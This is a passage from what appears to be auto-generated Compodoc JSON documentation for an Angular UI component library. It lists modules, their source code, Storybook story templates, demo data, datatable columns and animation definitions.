            "elements": []
          },
          {
            "type": "bootstrap",
            "elements": []
          },
          {
            "type": "classes",
            "elements": []
          }
        ]
      },
      {
        "name": "StoUserPreferenceModule",
        "id": "module-StoUserPreferenceModule-5696c66138a8e5e5c0a32ef18e494246727cc292070a57b57ba70aa71e25b4a49fb00c52c8df51448ff125d29fb278625ceec87c5b7b64734940cc668f57e17c",
        "description": "",
        "deprecationMessage": "",
        "deprecated": false,
        "file": "libs/core/src/lib/sto-user-preference/sto-user-preference.module.ts",
        "methods": [
          {
            "name": "forRoot",
            "args": [],
            "optional": false,
            "returnType": "ModuleWithProviders<StoUserPreferenceModule>",
            "typeParameters": [],
            "line": 14,
            "deprecated": false,
            "deprecationMessage": "",
            "modifierKind": [
              124
            ]
          }
        ],
        "sourceCode": "import { ModuleWithProviders, NgModule } from '@angular/core';\r\nimport { StoUserPreferenceService } from './sto-user-preference.service';\r\nimport { CommonModule } from '@angular/common';\r\nimport { StoUserPreferenceComponent } from './sto-user-preference.component';\r\nimport { MatExpansionModule } from '@angular/material/expansion';\r\nimport { FormsModule, ReactiveFormsModule } from '@angular/forms';\r\n\r\n@NgModule({\r\n  imports: [CommonModule, MatExpansionModule, ReactiveFormsModule, FormsModule],\r\n  exports: [StoUserPreferenceComponent],\r\n  declarations: [StoUserPreferenceComponent]\r\n})\r\nexport class StoUserPreferenceModule {\r\n  static forRoot(): ModuleWithProviders<StoUserPreferenceModule> {\r\n    return {\r\n      ngModule: StoUserPreferenceModule,\r\n      providers: [StoUserPreferenceService]\r\n    };\r\n  }\r\n}\r\n",
        "children": [
          {
            "type": "providers",
            "elements": []
          },
          {
            "type": "declarations",
            "elements": [
              {
                "name": "StoUserPreferenceComponent"
              }
            ]
          },
          {
            "type": "imports",
            "elements": []
          },
          {
            "type": "exports",
            "elements": [
              {
                "name": "StoUserPreferenceComponent"
              }
            ]
          },
          {
            "type": "bootstrap",
            "elements": []
          },
          {
            "type": "classes",
            "elements": []
          }
        ]
      },
      {
        "name": "StoWysiwygModule",
        "id": "module-StoWysiwygModule-2fd584b61277cefb8a752e3bf2116ae0adfc1475627da7fc1051948abd46d34f9d5330c762c8bcd04a7fdfd860eb6a6b82acd6cd6e78637d0fc4e40a1cd1f866",
        "description": "",
        "deprecationMessage": "",
        "deprecated": false,
        "file": "libs/form/src/lib/sto-wysiwyg/wysiwyg.module.ts",
        "methods": [],
        "sourceCode": "import { NgModule } from '@angular/core';\r\nimport { CommonModule } from '@angular/common';\r\nimport { WysiwygComponent } from './wysiwyg.component';\r\nimport { MatButtonModule } from '@angular/material/button';\r\nimport { MatIconModule } from '@angular/material/icon';\r\nimport { MatMenuModule } from '@angular/material/menu';\r\nimport { MatButtonToggleModule } from '@angular/material/button-toggle';\r\nimport { WysiwygActionsComponent } from './wysiwyg-actions/wysiwyg-actions.component';\r\nimport { WysiwygEditorComponent } from './wysiwyg-editor/wysiwyg-editor.component';\r\n\r\n@NgModule({\r\n  declarations: [ WysiwygComponent, WysiwygActionsComponent, WysiwygEditorComponent ],\r\n  imports: [\r\n    CommonModule,\r\n    MatButtonModule,\r\n    MatIconModule,\r\n    MatMenuModule,\r\n    MatButtonToggleModule\r\n  ],\r\n  exports: [ WysiwygComponent ]\r\n})\r\nexport class StoWysiwygModule {\r\n}\r\n",
        "children": [
          {
            "type": "providers",
            "elements": []
          },
          {
            "type": "declarations",
            "elements": [
              {
                "name": "WysiwygActionsComponent"
              },
              {
                "name": "WysiwygComponent"
              },
              {
                "name": "WysiwygEditorComponent"
              }
            ]
          },
          {
            "type": "imports",
            "elements": []
          },
          {
            "type": "exports",
            "elements": [
              {
                "name": "WysiwygComponent"
              }
            ]
          },
          {
            "type": "bootstrap",
            "elements": []
          },
          {
            "type": "classes",
            "elements": []
          }
        ]
      },
      {
        "name": "WrapperModule",
        "id": "module-WrapperModule-498d07118640af56499aaf20a9c2077b6c46bba76c932ab22263dfc299f2b7fbb43f9db943817229ad0b0c07b271332e5027c9507031fbd4d3d97378542b334b",
        "description": "",
        "deprecationMessage": "",
        "deprecated": false,
        "file": "libs/error-handler/src/lib/wrapper.ts",
        "methods": [],
        "sourceCode": "import { Component, Injectable, NgModule } from '@angular/core';\r\nimport { HttpClient, HttpClientModule, HttpErrorResponse } from '@angular/common/http';\r\nimport { CommonModule } from '@angular/common';\r\nimport { MatButtonModule } from '@angular/material/button';\r\nimport {\r\n  CUSTOM_ERROR_HANDLER, ERROR_LOGGER,\r\n  ErrorHandlerService,\r\n  Handler,\r\n  HttpError,\r\n  StoErrorHandler\r\n} from '@ngx-stoui/error-handler';\r\n\r\n@Component({\r\n  selector: 'next-wrapper',\r\n  template: `\r\n    <button mat-button\r\n            (click)=\"overRide(404)\">Overridden 404\r\n    </button>\r\n    <button mat-button\r\n            (click)=\"showError(s)\"\r\n            *ngFor=\"let s of errors\">{{s}} {{ s === 401 ? '(App Override)' : ''}}</button>\r\n  `,\r\n  providers: []\r\n})\r\nexport class NextWrapperComponent {\r\n  public errors = [\r\n    0,\r\n    400,\r\n    401,\r\n    403,\r\n    404,\r\n    409,\r\n    500,\r\n    501,\r\n    503\r\n  ];\r\n\r\n  constructor(private service: ErrorHandlerService) {\r\n  }\r\n\r\n  showError(status: number) {\r\n    const err = new HttpErrorResponse({\r\n      status,\r\n      error: {\r\n        message: 'server error message'\r\n      },\r\n      statusText: 'Error',\r\n      url: 'http://errorhandler/api'\r\n    });\r\n    this.service.handler(err);\r\n  }\r\n\r\n  overRide(status: number) {\r\n    const err = new HttpErrorResponse({\r\n      status,\r\n      error: {\r\n        message: 'server error message'\r\n      },\r\n      statusText: 'Error',\r\n      url: 'http://errorhandler/api'\r\n    });\r\n    const handler = function (err: HttpErrorResponse) {\r\n      const e = new HttpError(err);\r\n      e.title = 'Local override 404';\r\n      e.text = 'Local override not found item';\r\n      return e;\r\n    };\r\n    this.service.handler(err, handler);\r\n  }\r\n}\r\n\r\n@Injectable({\r\n  providedIn: 'root'\r\n})\r\nexport class ErrorHandlerImpl implements StoErrorHandler {\r\n  [ code: number ]: Handler;\r\n\r\n  401(err: HttpErrorResponse) {\r\n    const error = new HttpError(err);\r\n    error.title = 'Custom not signed in';\r\n    error.text = 'Custom not signed in text';\r\n    return error;\r\n  }\r\n}\r\n\r\n@Injectable({\r\n  providedIn: 'root'\r\n})\r\nexport class Logger {\r\n  constructor(private http: HttpClient) {\r\n  }\r\n\r\n  log(err: HttpError) {\r\n    // This method will typically go to the application backend or a central log repository\r\n    console.log('Error', err);\r\n  }\r\n}\r\n\r\nfunction LoggerFactory(http: HttpClient) {\r\n  return new Logger(http);\r\n}\r\n\r\n@NgModule({\r\n  declarations: [ NextWrapperComponent ],\r\n  imports: [ CommonModule, MatButtonModule, HttpClientModule ],\r\n  exports: [ NextWrapperComponent ],\r\n  providers: [\r\n    { provide: CUSTOM_ERROR_HANDLER, useClass: ErrorHandlerImpl },\r\n    { provide: ERROR_LOGGER, useFactory: LoggerFactory, deps: [ HttpClient ] }\r\n  ]\r\n})\r\nexport class WrapperModule {\r\n}\r\n\r\n",
        "children": [
          {
            "type": "providers",
            "elements": []
          },
          {
            "type": "declarations",
            "elements": [
              {
                "name": "NextWrapperComponent"
              }
            ]
          },
          {
            "type": "imports",
            "elements": []
          },
          {
            "type": "exports",
            "elements": [
              {
                "name": "NextWrapperComponent"
              }
            ]
          },
          {
            "type": "bootstrap",
            "elements": []
          },
          {
                    "type": "classes",
                    "elements": []
                }
            ]
        }
    ],
    "miscellaneous": {
        "variables": [
          {
            "name": "Accent",
            "ctype": "miscellaneous",
            "subtype": "variable",
            "file": "libs/common/src/lib/sto-message-panel/message-panel.stories.ts",
            "deprecated": false,
            "deprecationMessage": "",
            "type": "Story<StoMessagePanelComponent>",
            "defaultValue": "(args: StoMessagePanelComponent) => {\r\n  return {\r\n    template: '<sto-message-panel (dismissed)=\"dismiss()\" color=\"accent\" [dismissable]=\"false\" icon=\"info\">Accent Text Content</sto-message-panel>'\r\n  };\r\n}"
          },
          {
            "name": "Actionbar",
            "ctype": "miscellaneous",
            "subtype": "variable",
            "file": "libs/datatable/src/lib/datatable-custom.stories.ts",
            "deprecated": false,
            "deprecationMessage": "",
            "type": "Story<Partial<StoDatatableComponent<Record<string, >>>>",
            "defaultValue": "args => ( {\r\n  props: args,\r\n  template: `<h3>With an actionbar on the top left and right side</h3>\r\n<sto-datatable [virtualScroll]=\"true\" [scrollbarH]=\"true\" [autoSize]=\"true\" [footerRow]=\"footerRow\" [autoSizeOffset]=\"autoSizeOffset\" [height]=\"height\" [rows]=\"rows\" [columns]=\"columns\">\r\n  <sto-datatable-actions>\r\n      <sto-datatable-actions-left>\r\n        <button mat-icon-button><mat-icon>content_copy</mat-icon></button>\r\n        <button mat-icon-button><mat-icon>delete</mat-icon></button>\r\n       </sto-datatable-actions-left>\r\n      <sto-datatable-actions-right>\r\n        <button mat-icon-button><mat-icon>settings</mat-icon></button>\r\n      </sto-datatable-actions-right>\r\n  </sto-datatable-actions>\r\n</sto-datatable>`,\r\n} )"
          },
          {
            "name": "ActionFooter",
            "ctype": "miscellaneous",
            "subtype": "variable",
            "file": "libs/common/src/lib/sto-action-footer/action-footer.stories.ts",
            "deprecated": false,
            "deprecationMessage": "",
            "type": "",
            "defaultValue": "Template.bind({})"
          },
          {
            "name": "ALL_GRIDS",
            "ctype": "miscellaneous",
            "subtype": "variable",
            "file": "libs/core/src/lib/sto-directives/sto-grid.directive.ts",
            "deprecated": false,
            "deprecationMessage": "",
            "type": "[]",
            "defaultValue": "[ 'sto-f-grid--1', 'sto-f-grid--2', 'sto-f-grid--4', 'sto-f-grid--6' ]"
          },
          {
            "name": "AppHeader",
            "ctype": "miscellaneous",
            "subtype": "variable",
            "file": "libs/common/src/lib/sto-app-header/app-header.stories.ts",
            "deprecated": false,
            "deprecationMessage": "",
            "type": "",
            "defaultValue": "Template.bind({})"
          },
          {
            "name": "argTypes",
            "ctype": "miscellaneous",
            "subtype": "variable",
            "file": "libs/common/src/lib/sto-message-panel/message-panel.stories.ts",
            "deprecated": false,
            "deprecationMessage": "",
            "type": "object",
            "defaultValue": "{\r\n  color: { control: { disable: true } },\r\n  dismissable: { control: { disable: true } },\r\n  icon: { control: { disable: true } },\r\n  severity: { control: { disable: true } },\r\n}"
          },
          {
            "name": "AsTestEnvironment",
            "ctype": "miscellaneous",
            "subtype": "variable",
            "file": "libs/common/src/lib/sto-app-header/app-header.stories.ts",
            "deprecated": false,
            "deprecationMessage": "",
            "type": "Story<StoAppHeaderComponent>",
            "defaultValue": "(args: StoAppHeaderComponent) => {\r\n  return {\r\n    props: {\r\n      environmentName: 'Systemtest',\r\n      testEnvironment: true,\r\n      ...args\r\n    },\r\n    template: `<sto-app-header [breadCrumbs]=\"[ { label: 'Root' }, { label: 'SubModule' } ]\" [environmentName]=\"environmentName\" [testEnvironment]=\"true\"></sto-app-header>`\r\n  };\r\n}"
          },
          {
            "name": "AutoSize",
            "ctype": "miscellaneous",
            "subtype": "variable",
            "file": "libs/datatable/src/lib/datatable-custom.stories.ts",
            "deprecated": false,
            "deprecationMessage": "",
            "type": "Story",
            "defaultValue": "(args) => ( {\r\n  props: args,\r\n  template: `<h3>Autosize will ensure the table always uses all available height top-down</h3>\r\n<sto-datatable [virtualScroll]=\"true\" [autoSize]=\"true\" [autoSizeOffset]=\"autosizeOffset\" [height]=\"height\" [rows]=\"rows\" [columns]=\"columns\">\r\n</sto-datatable>`,\r\n} )"
          },
          {
            "name": "breadCrumbs",
            "ctype": "miscellaneous",
            "subtype": "variable",
            "file": "libs/common/src/test-utils.ts",
            "deprecated": false,
            "deprecationMessage": "",
            "type": "Breadcrumb[]",
            "defaultValue": "[\r\n  {\r\n    label: 'One',\r\n    command: () => {\r\n      console.log('Wat?');\r\n    }\r\n  }, {\r\n    label: 'Two',\r\n    command: () => {\r\n    },\r\n    segment: '2',\r\n  },\r\n]"
          },
          {
            "name": "Breadcrumbs",
            "ctype": "miscellaneous",
            "subtype": "variable",
            "file": "libs/common/src/lib/sto-breadcrumbs/sto-breadcrumbs.stories.ts",
            "deprecated": false,
            "deprecationMessage": "",
            "type": "",
            "defaultValue": "Template.bind({})"
          },
          {
            "name": "COLORS",
            "ctype": "miscellaneous",
            "subtype": "variable",
            "file": "libs/common/src/lib/sto-message-panel/sto-message-panel.component.ts",
            "deprecated": false,
            "deprecationMessage": "",
            "type": "[]",
            "defaultValue": "[\r\n  'primary', 'accent', 'warning', 'danger', 'success'\r\n]"
          },
          {
            "name": "columns",
            "ctype": "miscellaneous",
            "subtype": "variable",
            "file": "libs/datatable/src/lib/rows.ts",
            "deprecated": false,
            "deprecationMessage": "",
            "type": "[]",
            "defaultValue": "[\r\n  {\r\n    prop: 'invoiceNo',\r\n    name: 'Invoice# (randsort)',\r\n    flexBasis: 200,\r\n    flexShrink: 1,\r\n    flexGrow: 1,\r\n    // random sort\r\n    sortFn: () => {\r\n      let n = Math.round(Math.random() * 1000);\r\n      if (n < 500) {\r\n        n = -n;\r\n      }\r\n      return n;\r\n    }\r\n  },\r\n  {\r\n    prop: 'voyageNo',\r\n    flexBasis: 200,\r\n    disableResize: true,\r\n    name: 'Voyage# (no resize)',\r\n    disableSort: true,\r\n    headerClass: 'aclass',\r\n    cellClass: () => {\r\n      return 'a-cell-class';\r\n    }\r\n  },\r\n  {\r\n    prop: 'vesselName',\r\n    flexBasis: 200,\r\n    name: 'Vessel',\r\n    headerClass: 'bclass',\r\n    flexGrow: 1\r\n  },\r\n  {\r\n    prop: 'allocated',\r\n    flexBasis: 200,\r\n    name: 'Allocated',\r\n    headerClass: 'aclass'\r\n  },\r\n  {\r\n    prop: 'total',\r\n    flexBasis: 200,\r\n    name: 'Total',\r\n    headerClass: 'aclass',\r\n    cellClass: 'a-cell-class'\r\n  }\r\n]"
          },
          {
            "name": "columns",
            "ctype": "miscellaneous",
            "subtype": "variable",
            "file": "libs/datatable/src/testing/utils.ts",
            "deprecated": false,
            "deprecationMessage": "",
            "type": "Column[]",
            "defaultValue": "[\r\n  { prop: 'invoiceNo', name: 'invoiceNo', },\r\n  { prop: 'voyageNo', name: 'voyageNo', },\r\n  { prop: 'vesselName', name: 'vesselName', },\r\n  { prop: 'allocated', name: 'allocated', },\r\n  { prop: 'total', name: 'total' },\r\n]"
          },
          {
            "name": "context",
            "ctype": "miscellaneous",
            "subtype": "variable",
            "file": "libs/core/src/test.ts",
            "deprecated": false,
            "deprecationMessage": "",
            "type": "",
            "defaultValue": "require.context('./', true, /\\.spec\\.ts$/)"
          },
          {
            "name": "context",
            "ctype": "miscellaneous",
            "subtype": "variable",
            "file": "libs/common/src/test.ts",
            "deprecated": false,
            "deprecationMessage": "",
            "type": "",
            "defaultValue": "require.context('./', true, /\\.spec\\.ts$/)"
          },
          {
            "name": "context",
            "ctype": "miscellaneous",
            "subtype": "variable",
            "file": "libs/datatable/src/test.ts",
            "deprecated": false,
            "deprecationMessage": "",
            "type": "",
            "defaultValue": "require.context('./', true, /\\.spec\\.ts$/)"
          },
          {
            "name": "context",
            "ctype": "miscellaneous",
            "subtype": "variable",
            "file": "libs/drawer/src/test.ts",
            "deprecated": false,
            "deprecationMessage": "",
            "type": "",
            "defaultValue": "require.context('./', true, /\\.spec\\.ts$/)"
          },
          {
            "name": "context",
            "ctype": "miscellaneous",
            "subtype": "variable",
            "file": "libs/form/src/test.ts",
            "deprecated": false,
            "deprecationMessage": "",
            "type": "",
            "defaultValue": "require.context('./', true, /\\.spec\\.ts$/)"
          },
          {
            "name": "context",
            "ctype": "miscellaneous",
            "subtype": "variable",
            "file": "libs/error-handler/src/test.ts",
            "deprecated": false,
            "deprecationMessage": "",
            "type": "",
            "defaultValue": "require.context('./', true, /\\.spec\\.ts$/)"
          },
          {
            "name": "control",
            "ctype": "miscellaneous",
            "subtype": "variable",
            "file": "libs/form/src/lib/number-input/value-unit-input.stories.ts",
            "deprecated": false,
            "deprecationMessage": "",
            "type": "",
            "defaultValue": "new FormControl({ value: 32.123, unit: 'C' }, Validators.required)"
          },
          {
            "name": "CUSTOM_ERROR_HANDLER",
            "ctype": "miscellaneous",
            "subtype": "variable",
            "file": "libs/error-handler/src/lib/error-handler/token.ts",
            "deprecated": false,
            "deprecationMessage": "",
            "type": "",
            "defaultValue": "new InjectionToken<ErrorHandler>('sto.custom-error-handler')"
          },
          {
            "name": "Danger",
            "ctype": "miscellaneous",
            "subtype": "variable",
            "file": "libs/common/src/lib/sto-message-panel/message-panel.stories.ts",
            "deprecated": false,
            "deprecationMessage": "",
            "type": "Story<StoMessagePanelComponent>",
            "defaultValue": "(args: StoMessagePanelComponent) => {\r\n  return {\r\n    template: '<sto-message-panel (dismissed)=\"dismiss()\" color=\"danger\" [dismissable]=\"false\" icon=\"error\">Danger Text Content (a little to red atm.. :) )</sto-message-panel>'\r\n  };\r\n}"
          },
          {
            "name": "dialogConfig",
            "ctype": "miscellaneous",
            "subtype": "variable",
            "file": "libs/common/src/lib/sto-confirm-dialog/sto-confirm-dialog.service.ts",
            "deprecated": false,
            "deprecationMessage": "",
            "type": "",
            "defaultValue": "new MatDialogConfig()"
          },
          {
            "name": "Dismissable",
            "ctype": "miscellaneous",
            "subtype": "variable",
            "file": "libs/common/src/lib/sto-message-panel/message-panel.stories.ts",
            "deprecated": false,
            "deprecationMessage": "",
            "type": "Story<StoMessagePanelComponent>",
            "defaultValue": "(args: StoMessagePanelComponent) => {\r\n  return {\r\n    props: { dismiss: action('Dismissed') },\r\n    template: '<sto-message-panel (dismissed)=\"dismiss()\" [dismissable]=\"true\">Dismissable Text Content</sto-message-panel>'\r\n  };\r\n}"
          },
          {
            "name": "drawerAnimations",
            "ctype": "miscellaneous",
            "subtype": "variable",
            "file": "libs/drawer/src/lib/animation.ts",
            "deprecated": false,
            "deprecationMessage": "",
            "type": "[]",
            "defaultValue": "[\r\n  drawerOpenAnimation,\r\n  overlayAnimation\r\n]"
          },
          {
            "name": "drawerOpenAnimation",
            "ctype": "miscellaneous",
            "subtype": "variable",
            "file": "libs/drawer/src/lib/animation.ts",
            "deprecated": false,
            "deprecationMessage": "",
            "type": "",
            "defaultValue": "trigger('drawerAnimations', [\r\n  state('open-left', style({ transform: 'translateX(0)', opacity: 1 })),\r\n  state('open-right', style({ transform: 'translateX(0)', opacity: 1 })),\r\n  state('openImmediate', style({ transform: 'translateX(0)', opacity: 1 })),\r\n  state('closedImmediate-left', style({ transform: 'translateX(-100%)', opacity: 0 })),\r\n  state('closedImmediate-right', style({ transform: 'translateX(100%)', opacity: 0 })),\r\n  state('closed-left', style({ transform: 'translateX(-100%)', opacity: 0 })),\r\n  state('closed-right', style({ transform: 'translateX(100%)', opacity: 0 })),\r\n  transition('* => closed-left', [\r\n    group([\r\n      animate('400ms ease-in-out', style({ transform: 'translateX(-100%)' })),\r\n      animate('1ms 400ms ease', style({ opacity: 0 }))\r\n    ])\r\n  ]),\r\n  transition('* => closed-right', [\r\n    group([\r\n      animate('400ms ease-in-out', style({ transform: 'translateX(100%)' })),\r\n      animate('1ms 400ms ease', style({ opacity: 0 }))\r\n    ])\r\n  ]),\r\n  transition('* => open-left', [\r\n    style({ transform: 'translateX(-100%)', opacity: 1 }),\r\n    animate('400ms ease-in-out')\r\n  ]),\r\n  transition('* => open-right', [\r\n    style({ transform: 'translateX(100%)', opacity: 1 }),\r\n    animate('400ms ease-in-out')\r\n  ]),\r\n])"
          },
          {
            "name": "environment",
            "ctype": "miscellaneous",
            "subtype": "variable",
            "file": "apps/oilmod-web/src/environments/environment.prod.ts",
            "deprecated": false,
            "deprecationMessage": "",
            "type": "object",
            "defaultValue": "{\r\n  production: true,\r\n}"
          },
          {
            "name": "environment",
            "ctype": "miscellaneous",
            "subtype": "variable",
            "file": "apps/oilmod-web/src/environments/environment.ts",
            "deprecated": false,
            "deprecationMessage": "",
            "type": "object",
            "defaultValue": "{\r\n  production: false,\r\n}"
          },
          {
            "name": "ERROR_LOGGER",
            "ctype": "miscellaneous",
            "subtype": "variable",
            "file": "libs/error-handler/src/lib/error-handler/token.ts",
            "deprecated": false,
            "deprecationMessage": "",
            "type": "",
            "defaultValue": "new InjectionToken<ErrorLogger>('sto.error-logger')"
          },
          {
            "name": "FilterPanel",
            "ctype": "miscellaneous",
            "subtype": "variable",
            "file": "libs/common/src/lib/sto-filter/filter-panel.stories.ts",
            "deprecated": false,
            "deprecationMessage": "",
            "type": "",
            "defaultValue": "Template.bind({})"
          },
          {
            "name": "fixedColumns",
            "ctype": "miscellaneous",
            "subtype": "variable",
            "file": "libs/datatable/src/lib/rows.ts",
            "deprecated": false,
            "deprecationMessage": "",
            "type": "[]",
            "defaultValue": "[...columns.map(col => ({...col, flexGrow: 0})), ...columns.map(col => ({\r\n  ...col,\r\n  flexGrow: 0\r\n}))]"
          },
          {
            "name": "getClass",
            "ctype": "miscellaneous",
            "subtype": "variable",
            "file": "libs/core/src/lib/sto-directives/sto-grid.directive.ts",
            "deprecated": false,
            "deprecationMessage": "",
            "type": "",
            "defaultValue": "(width: number, small = 400, large = 800) => {\r\n  let cols = 1;\r\n  if ( width > small ) {\r\n    cols += 1;\r\n  }\r\n  if ( width > large ) {\r\n    cols += 2;\r\n  }\r\n  return `sto-f-grid--${cols}`;\r\n}"
          },
          {
            "name": "getGreeting",
            "ctype": "miscellaneous",
            "subtype": "variable",
            "file": "apps/oilmod-web-e2e/src/support/app.po.ts",
            "deprecated": false,
            "deprecationMessage": "",
            "type": "",
            "defaultValue": "() => cy.get('h1')"
          },
          {
            "name": "iconMap",
            "ctype": "miscellaneous",
            "subtype": "variable",
            "file": "libs/common/src/lib/theme/svg-icons.ts",
            "deprecated": false,
            "deprecationMessage": "",
            "type": "",
            "defaultValue": "new Map([\r\n  [ 'equinor', `<svg width=\"26\" height=\"30\" viewBox=\"0 0 26 30\" fill=\"none\" xmlns=\"http://www.w3.org/2000/svg\">\r\n<path fill-rule=\"evenodd\" clip-rule=\"evenodd\" d=\"M3.20802 6.37778L3.20825 14.4349C3.20802 14.6738 3.32778 14.8944 3.53463 15.0135L10.5162 19.0356C10.8124 19.2063 11.1901 18.9925 11.1903 18.6506V10.5937C11.1905 10.3548 11.0632 10.1342 10.8561 10.0149L3.87479 5.99297C3.5784 5.82233 3.20847 6.03607 3.20802 6.37778ZM24.7118 0.0862991L14.6605 5.87699C14.3628 6.04851 14.1793 6.36601 14.1797 6.70972V18.3095C14.1802 18.8019 14.7239 19.1094 15.1502 18.8637L25.2017 13.0734C25.4994 12.9017 25.6716 12.5842 25.6711 12.2405L25.6714 0.640639C25.6709 0.148287 25.1383 -0.15921 24.7118 0.0862991ZM10.9237 24.7574L8.13043 26.3669C8.04778 26.4147 7.99668 26.5029 7.99668 26.5984L7.99646 29.8218C7.99646 29.9589 8.14798 30.0442 8.2664 29.976L11.0597 28.3668C11.1425 28.3192 11.1905 28.2308 11.1903 28.1355V24.9116C11.1903 24.775 11.0421 24.6895 10.9237 24.7574ZM9.29577 21.7831L5.11256 19.3625C4.98858 19.2909 4.83572 19.2909 4.71174 19.3625L0.528527 21.7831C0.351005 21.8858 0.351005 22.1419 0.528527 22.2448L4.71174 24.665C4.83572 24.737 4.98858 24.737 5.11256 24.665L9.29577 22.2448C9.47329 22.1419 9.47329 21.8858 9.29577 21.7831ZM16.0303 22.2195L17.889 23.2948C17.999 23.3586 18.1348 23.3586 18.245 23.2948L20.1035 22.2195C20.2613 22.1279 20.2613 21.9002 20.1035 21.8089L18.245 20.7335C18.1348 20.6698 17.999 20.6698 17.889 20.7335L16.0303 21.8089C15.8725 21.9002 15.8725 22.1279 16.0303 22.2195ZM14.5352 24.8077L16.3958 25.8794C16.506 25.943 16.574 26.0607 16.574 26.1881L16.5717 28.3352C16.5715 28.5174 16.3742 28.6314 16.2162 28.5405L14.3557 27.4687C14.2455 27.4052 14.18 27.287 14.18 27.1601L14.1797 25.0129C14.1797 24.831 14.3773 24.7166 14.5352 24.8077Z\" fill=\"#EB0037\"/>\r\n</svg>` ]\r\n])"
          },
          {
            "name": "items",
            "ctype": "miscellaneous",
            "subtype": "variable",
            "file": "libs/form/src/lib/sto-select-filter/item-list.ts",
            "deprecated": false,
            "deprecationMessage": "",
            "type": "[]",
            "defaultValue": "[\r\n  {id: 1, name: 'TEST1', longName: 'LONG TEST1'},\r\n  {id: 2, name: 'TEST2', longName: 'LONG TEST2'},\r\n  {id: 3, name: 'TEST3', longName: 'LONG TEST3'},\r\n  {id: 4, name: 'TEST4', longName: 'LONG TEST4'},\r\n  {id: 5, name: 'TEST5', longName: 'LONG TEST5'},\r\n  {id: 6, name: 'TEST6', longName: 'LONG TEST6'},\r\n  {id: 7, name: 'TEST7', longName: 'LONG TEST7'},\r\n  {id: 8, name: 'TEST8', longName: 'LONG TEST8'},\r\n  {id: 9, name: 'TEST9', longName: 'LONG TEST9'},\r\n  {id: 10, name: 'TEST10', longName: 'LONG TEST10'},\r\n]"
          },
          {
            "name": "manyColumns",
            "ctype": "miscellaneous",
            "subtype": "variable",
            "file": "libs/datatable/src/lib/rows.ts",
            "deprecated": false,
            "deprecationMessage": "",
            "type": "[]",
            "defaultValue": "[...columns, ...columns, ...columns]"
          },
          {
            "name": "MultilineFooter",
            "ctype": "miscellaneous",
            "subtype": "variable",
            "file": "libs/datatable/src/lib/datatable-custom.stories.ts",
            "deprecated": false,
            "deprecationMessage": "",
            "type": "Story<Partial<StoDatatableComponent<Record<string, >>>>",
            "defaultValue": "args => ( {\r\n  props: args,\r\n  template: `<h3>The table takes in a list of footer rows</h3>\r\n<sto-datatable [virtualScroll]=\"true\" [scrollbarH]=\"true\" [autoSize]=\"true\" [footerRow]=\"footerRow\" [autoSizeOffset]=\"autoSizeOffset\" [height]=\"height\" [rows]=\"rows\" [columns]=\"columns\"></sto-datatable>`,\r\n} )"
          },
          {
            "name": "MultiSelect",
            "ctype": "miscellaneous",
            "subtype": "variable",
            "file": "libs/form/src/lib/sto-select-filter/mat-select-filter.stories.ts",
            "deprecated": false,
            "deprecationMessage": "",
            "type": "Story<any>",
            "defaultValue": "(args) => ( {\r\n  props: { ...args }, template: `\r\n<mat-card style=\"width: 300px\" class=\"sto-form\" >\r\n  <mat-form-field class=\"sto-form__field\"\r\n                  floatLabel=\"always\" >\r\n    <mat-label>Multiselect with filter</mat-label>\r\n    <mat-select [multiple]=\"true\"\r\n                (selectionChange)=\"valueChange($event)\"\r\n                [value]=\"selected\">\r\n      <sto-select-filter (keydown.space)=\"$event.stopPropagation()\"\r\n                         [selected]=\"select?.length\"\r\n                         [isFilter]=\"true\"\r\n                         [focusIfNoValue]=\"focusIfNoValue\"\r\n                         [isMulti]=\"true\"\r\n                         (valueChanges)=\"filteredItems = filter($event, allItems)\"\r\n                         (selectAll)=\"selected = $event ? filteredItems :[]; selectAll($event)\"></sto-select-filter>\r\n      <mat-option *ngFor=\"let opt of filteredItems\"\r\n                  [value]=\"opt\">{{opt.name}}</mat-option>\r\n    </mat-select>\r\n  </mat-form-field>\r\n</mat-card>`\r\n} )"
          },
          {
            "name": "navigation",
            "ctype": "miscellaneous",
            "subtype": "variable",
            "file": "libs/drawer/src/lib/sto-navigation/navigation.ts",
            "deprecated": false,
            "deprecationMessage": "",
            "type": "object",
            "defaultValue": "{\r\n  'name': 'Web applications',\r\n  'groups': [\r\n    {\r\n      'name': 'Application 1',\r\n      'items': [\r\n        {\r\n          'id': 'a11',\r\n          'name': 'Application 1.1',\r\n          'svgIcon': false,\r\n          'icon': 'build',\r\n          'command': {\r\n            'type': 'navigate',\r\n            'arguments': [\r\n              'a11'\r\n            ]\r\n          }\r\n        },\r\n        {\r\n          'id': 'a12',\r\n          'name': 'Application 1.2',\r\n          'svgIcon': false,\r\n          'icon': 'attach_money',\r\n          'command': {\r\n            'type': 'navigate',\r\n            'arguments': [\r\n              'a12'\r\n            ]\r\n          }\r\n        }\r\n      ]\r\n    },\r\n    {\r\n      'name': 'Application 2',\r\n      'external': false,\r\n      'items': [\r\n        {\r\n          'id': 'a2',\r\n          'name': 'Application 2',\r\n          'svgIcon': false,\r\n          'icon': 'train',\r\n          'command': {\r\n            'type': 'navigate',\r\n            'arguments': [\r\n              'a2'\r\n            ]\r\n          }\r\n        }\r\n      ]\r\n    },\r\n    {\r\n      'name': 'Application 3',\r\n      'items': [\r\n        {\r\n          'id': 'a3',\r\n          'name': 'Application 3',\r\n          'svgIcon': false,\r\n          'icon': 'local_library',\r\n          'command': {\r\n            'type': 'externalLinkNewWindow',\r\n            'arguments': []\r\n          }\r\n        }\r\n      ]\r\n    }\r\n  ]\r\n}"
          },
          {
            "name": "NAVIGATION_HOME_ICON",
            "ctype": "miscellaneous",
            "subtype": "variable",
            "file": "libs/common/src/lib/sto-breadcrumbs/breadcrumb.ts",
            "deprecated": false,
            "deprecationMessage": "",
            "type": "",
            "defaultValue": "new InjectionToken<BreadcrumbConfig>('sto-home-icon')"
          },
          {
            "name": "navigationItems",
            "ctype": "miscellaneous",
            "subtype": "variable",
            "file": "libs/drawer/src/lib/nav-drawer/nav-drawer.stories.ts",
            "deprecated": false,
            "deprecationMessage": "",
            "type": "[]",
